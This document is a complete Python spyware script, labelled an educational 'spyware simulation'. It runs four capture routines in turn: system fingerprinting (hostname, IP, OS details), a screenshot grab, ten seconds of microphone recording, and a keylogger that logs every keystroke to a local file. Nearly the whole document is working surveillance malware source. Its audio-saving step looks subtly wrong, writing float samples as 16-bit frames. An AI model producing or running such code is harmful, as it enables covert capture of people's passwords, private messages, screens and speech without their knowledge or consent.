import platform
import socket
from pynput import keyboard
import pyautogui
import sounddevice as sd
import wave

# File paths for saving logs and captures
LOG_FILE = "keylogs.txt"
SYS_INFO_FILE = "sysinfo.txt"
SCREENSHOT_FILE = "screenshot.png"
AUDIO_FILE = "audio_recording.wav"

# 1. Keylogger
def keylogger():
    def on_press(key):
        with open(LOG_FILE, "a") as log_file:
            try:
                log_file.write(f"{key.char}")
            except AttributeError:
                log_file.write(f"{key} ")  # For special keys like Space, Enter, etc.

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# 2. System Information
def gather_system_info():
    sys_info = {
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "System": platform.system(),
        "Version": platform.version(),
        "Architecture": platform.architecture()[0],
        "Processor": platform.processor()
    }
    with open(SYS_INFO_FILE, "w") as sys_file:
        for key, value in sys_info.items():
            sys_file.write(f"{key}: {value}\n")

# 3. Screenshot Capture
def capture_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save(SCREENSHOT_FILE)

# 4. Microphone Recording
def record_audio(duration=10):
    print("Recording audio...")
    fs = 44100  # Sampling frequency
    try:
        # Adjusted to record with one channel (mono) for compatibility
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
        sd.wait()
        with wave.open(AUDIO_FILE, "w") as wf:
            wf.setnchannels(1)  # Mono audio
            wf.setsampwidth(2)  # 16 bits = 2 bytes
            wf.setframerate(fs)
            wf.writeframes(recording.tobytes())
        print("Audio recording saved successfully.")
    except Exception as e:
        print(f"Error recording audio: {e}")


# 5. Main Payload
def run_payload():
    print("Gathering system information...")
    gather_system_info()

    print("Capturing screenshot...")
    capture_screenshot()

    print("Recording audio...")
    record_audio()

    print("Starting keylogger...")
    keylogger()

if __name__ == "__main__":
    print("Starting spyware simulation for educational purposes...")
    run_payload()
